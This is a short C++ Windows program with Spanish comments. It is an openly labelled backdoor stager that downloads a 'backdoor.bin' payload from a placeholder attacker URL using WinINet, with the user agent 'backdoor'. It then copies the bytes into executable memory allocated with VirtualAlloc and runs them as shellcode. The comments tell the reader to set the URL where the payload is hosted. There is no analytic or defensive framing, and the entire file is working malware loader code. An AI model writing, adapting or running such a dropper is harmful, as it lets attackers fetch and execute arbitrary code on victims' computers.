#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

void ExecutePayload(unsigned char* shellcode, size_t shellcodeSize) {
    void* exec_mem = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, shellcodeSize);
    ((void(*)())exec_mem)();
}

unsigned char* DownloadShellcode(const char* url, size_t& outSize) {
    HINTERNET hInternet = InternetOpenA("backdoor", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return nullptr;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return nullptr;
    }

    unsigned char* buffer = new unsigned char[1024 * 1024]; // Asigna un búfer de hasta 1MB (ajusta según sea necesario).
    DWORD bytesRead;
    outSize = 0;

    while (InternetReadFile(hConnect, buffer + outSize, 1024, &bytesRead) && bytesRead != 0) {
        outSize += bytesRead;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

int main() {
    const char* url = "http://<URL_del_backdoor>/backdoor.bin"; // Cambia a la URL donde está alojado el payload.
    size_t shellcodeSize;
    unsigned char* shellcode = DownloadShellcode(url, shellcodeSize);

    if (shellcode && shellcodeSize > 0) {
        ExecutePayload(shellcode, shellcodeSize);
    } else {
        printf("Error al descargar el shellcode.\n");
    }

    delete[] shellcode;
    return 0;
}

